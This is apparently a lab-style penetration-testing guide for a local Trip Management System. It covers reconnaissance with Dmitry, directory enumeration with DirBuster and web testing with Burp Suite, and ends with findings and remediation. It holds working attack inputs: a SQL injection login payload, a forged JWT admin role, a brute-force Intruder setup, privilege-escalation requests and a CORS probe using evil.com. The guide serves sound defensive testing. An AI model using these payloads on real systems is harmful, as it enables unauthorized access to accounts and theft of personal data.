# Penetration Testing with Dmitry, DirBuster, and Burp Suite

## Overview
This guide walks through using professional penetration testing tools to identify vulnerabilities in the Trip Management System.

---

## Phase 1: Reconnaissance with Dmitry

### What is Dmitry?
Dmitry (Deepmagic Information Gathering Tool) is a command-line tool for gathering information about hosts and networks.

### Installation
```bash
# Ubuntu/Debian
sudo apt-get install dmitry

# macOS
brew install dmitry

# Verify installation
dmitry -h
```

### Basic Reconnaissance

#### 1.1 Gather Host Information
```bash
# Scan localhost for open ports and services
dmitry -p localhost

# Output will show:
# - Open ports
# - Service versions
# - Potential vulnerabilities
```

#### 1.2 Perform DNS Lookup
```bash
# Get DNS information
dmitry -n localhost

# Useful for understanding domain structure
```

#### 1.3 Whois Lookup (for VM IP)
```bash
# Get registration information
dmitry -w <vm-ip>
```

#### 1.4 Combine Multiple Scans
```bash
# Comprehensive scan
dmitry -p -n -w localhost

# Save results to file
dmitry -p -n -w localhost > dmitry_results.txt
```

### Expected Findings
- **Open Ports**: 3000 (backend), 3001 (frontend), 3307 (database)
- **Services**: Node.js, Nginx, MySQL
- **Potential Issues**: Database port exposed, unencrypted HTTP

---

## Phase 2: Directory Enumeration with DirBuster

### What is DirBuster?
DirBuster is a multi-threaded Java application designed to brute force directories and files on web servers.

### Installation
```bash
# Ubuntu/Debian
sudo apt-get install dirbuster

# macOS
brew install dirbuster

# Or download from: https://www.owasp.org/index.php/DirBuster
```

### Using DirBuster GUI

#### 2.1 Launch DirBuster
```bash
dirbuster &
```

#### 2.2 Configure Target
1. **Target URL**: `http://localhost:3001`
2. **Port**: 3001
3. **Use GET requests**: Check
4. **Go Faster**: Increase threads to 50-100

#### 2.3 Select Wordlist
- **Location**: `/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`
- Or use: `/usr/share/wordlists/dirb/common.txt`

#### 2.4 Start Scan
1. Click "Start" button
2. Monitor results in real-time
3. Look for HTTP 200 responses (found resources)

### Expected Findings
```
HTTP 200:
- /
- /index.html
- /api.js
- /app.js
- /styles.css
- /config.js

HTTP 404:
- /admin (not found - good)
- /config (not found - good)
- /database (not found - good)
```

### DirBuster Command Line (Alternative)
```bash
# Scan with wordlist
dirb http://localhost:3001 /usr/share/wordlists/dirb/common.txt -o dirb_results.txt

# Scan backend API
dirb http://localhost:3000/api /usr/share/wordlists/dirb/common.txt -o dirb_api_results.txt
```

### Analyzing Results
- **200 responses**: Accessible resources
- **403 responses**: Forbidden (access denied)
- **404 responses**: Not found
- **500 responses**: Server errors (potential vulnerabilities)

---

## Phase 3: Web Proxy Analysis with Burp Suite

### What is Burp Suite?
Burp Suite is a comprehensive web application security testing platform with:
- Proxy (intercept requests/responses)
- Scanner (automated vulnerability detection)
- Repeater (modify and resend requests)
- Intruder (automated attacks)
- Decoder (encode/decode data)

### Installation
```bash
# Download from: https://portswigger.net/burp/communitydownload
# Or install via package manager:

# Ubuntu/Debian
sudo apt-get install burpsuite

# macOS
brew install burp-suite-community
```

### 3.1 Configure Browser Proxy

#### Firefox Setup
1. **Preferences** → **Network Settings**
2. **Manual proxy configuration**
3. **HTTP Proxy**: 127.0.0.1
4. **Port**: 8080
5. **Use this proxy for all protocols**: Check

#### Chrome Setup
```bash
# Launch Chrome with proxy
google-chrome --proxy-server="http://127.0.0.1:8080"
```

### 3.2 Launch Burp Suite
```bash
# Start Burp Suite
burpsuite &

# Or if installed as JAR
java -jar burpsuite_community.jar &
```

### 3.3 Configure Burp Proxy
1. **Proxy** tab → **Options**
2. **Proxy Listeners**: 127.0.0.1:8080
3. **Intercept Client Requests**: Check
4. **Intercept Server Responses**: Check (optional)

### 3.4 Test Interception
1. Navigate to `http://localhost:3001` in browser
2. Burp intercepts the request
3. Click **Forward** to allow request
4. Observe request/response in **HTTP history**

---

## Phase 4: Vulnerability Testing with Burp

### 4.1 Test Weak Password Validation

#### Steps
1. **Intercept** registration request
2. **Repeater** tab → paste request
3. Modify password to "1"
4. Send request
5. **Observe**: If 201 response, vulnerability confirmed

#### Request Example
```http
POST /api/auth/register HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"test@example.com","password":"1","firstName":"Test","lastName":"User"}
```

#### Expected Response
```http
HTTP/1.1 201 Created
{"user_id":5,"token":"eyJhbGc...","role":"member"}
```

**Finding**: System accepts 1-character passwords ✓ VULNERABLE

---

### 4.2 Test Horizontal Privilege Escalation

#### Steps
1. **Login** as member@example.com
2. **Intercept** request to `/api/members/3`
3. **Repeater** → Send request
4. **Observe**: Response includes medical_info, home_address

#### Request
```http
GET /api/members/3 HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJhbGc...
```

#### Expected Response
```http
HTTP/1.1 200 OK
{
  "user_id": 3,
  "first_name": "Jane",
  "last_name": "Leader",
  "email": "leader@example.com",
  "home_address": "123 Main St",
  "medical_info": "Asthma",
  "fitness_notes": "Beginner"
}
```

**Finding**: Any authenticated user can view confidential info ✓ VULNERABLE

---

### 4.3 Test JWT Token Forgery

#### Steps
1. **Intercept** login response
2. **Copy** JWT token
3. **Decoder** tab → Paste token
4. **Decode** from Base64
5. **Modify** role from "member" to "system_admin"
6. **Encode** back to Base64
7. **Repeater** → Use forged token in Authorization header

#### Token Structure
```
Header.Payload.Signature

Payload (decoded):
{
  "user_id": 2,
  "email": "member@example.com",
  "role": "member",
  "iat": 1719734400,
  "exp": 1719820800
}
```

#### Modify to
```json
{
  "user_id": 2,
  "email": "member@example.com",
  "role": "system_admin",
  "iat": 1719734400,
  "exp": 1719820800
}
```

#### Test with Forged Token
```http
GET /api/admin/users HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Finding**: If 200 response, JWT signature not validated ✓ VULNERABLE

---

### 4.4 Test SQL Injection in Login

#### Steps
1. **Repeater** → Create POST request
2. **Modify** email field with SQL payload
3. Send request
4. **Observe** response

#### Payload
```http
POST /api/auth/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"admin@example.com\" OR \"1\"=\"1","password":"anything"}
```

**Finding**: If login succeeds, SQL injection is possible ✓ VULNERABLE

---

### 4.5 Test Brute Force (Intruder)

#### Steps
1. **Intercept** login request
2. **Send to Intruder**
3. **Positions** tab → Select password value
4. **Payloads** tab → Load password list
5. **Start attack**
6. **Results** → Look for 200 responses

#### Configuration
- **Attack Type**: Battering ram
- **Payload**: Common passwords (password123, admin, etc.)
- **Threads**: 10

**Finding**: If multiple successful logins, no rate limiting ✓ VULNERABLE

---

### 4.6 Test CORS Misconfiguration

#### Steps
1. **Repeater** → Create request
2. **Add header**: `Origin: http://evil.com`
3. Send request
4. **Observe** response headers

#### Request
```http
GET /api/events HTTP/1.1
Host: localhost:3000
Origin: http://evil.com
Authorization: Bearer eyJhbGc...
```

#### Expected Response
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Credentials: true
```

**Finding**: If CORS allows unauthorized origins ✓ VULNERABLE

---

### 4.7 Test Information Disclosure

#### Steps
1. **Repeater** → Request invalid endpoint
2. **Observe** error messages
3. Look for database/system details

#### Request
```http
GET /api/events/invalid HTTP/1.1
Host: localhost:3000
```

#### Expected Response
```http
HTTP/1.1 500 Internal Server Error
{
  "error": "ER_BAD_FIELD_ERROR: Unknown column 'invalid' in 'where clause'"
}
```

**Finding**: Error reveals database structure ✓ VULNERABLE

---

## Phase 5: Automated Scanning with Burp Scanner

### 5.1 Run Active Scan
1. **Dashboard** → **New scan**
2. **Scope**: http://localhost:3000
3. **Scan type**: Active scan
4. **Start scan**
5. **Monitor** progress

### 5.2 Review Findings
1. **Results** tab
2. **Sort by severity**: Critical → High → Medium
3. **Review each finding**:
   - Description
   - Severity
   - Confidence
   - Remediation

### 5.3 Export Report
1. **Report** → **Generate report**
2. **Format**: HTML or PDF
3. **Include**: All findings, evidence, recommendations

---

## Summary of Findings

### Critical Vulnerabilities Found
1. ✓ Weak JWT Secret (can forge tokens)
2. ✓ Horizontal Privilege Escalation (access others' data)
3. ✓ No HTTPS Enforcement (data in transit unencrypted)
4. ✓ Weak Password Validation (1-character passwords)

### High Severity
5. ✓ No Brute Force Protection (unlimited login attempts)
6. ✓ No Input Validation (XSS/injection possible)
7. ✓ Unencrypted Sensitive Data (medical info in plaintext)

### Medium Severity
8. ✓ Information Disclosure (error messages reveal details)
9. ✓ No Audit Logging (no accountability)
10. ✓ No Rate Limiting (DoS possible)

---

## Remediation Checklist

- [ ] Implement strong password validation
- [ ] Fix JWT secret (use environment variable)
- [ ] Add authorization checks for data access
- [ ] Implement HTTPS/TLS
- [ ] Add rate limiting to login endpoint
- [ ] Sanitize all user input
- [ ] Encrypt sensitive database fields
- [ ] Generic error messages
- [ ] Add audit logging
- [ ] Implement rate limiting on all endpoints

---

## Tools Summary

| Tool | Purpose | Finding Type |
|------|---------|--------------|
| **Dmitry** | Reconnaissance | Open ports, services, versions |
| **DirBuster** | Directory enumeration | Hidden endpoints, files |
| **Burp Suite** | Web app testing | Logic flaws, auth issues, data exposure |

---

## References

- [Dmitry Documentation](https://www.kali.org/tools/dmitry/)
- [DirBuster Guide](https://www.owasp.org/index.php/DirBuster)
- [Burp Suite Community](https://portswigger.net/burp/communitydownload)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
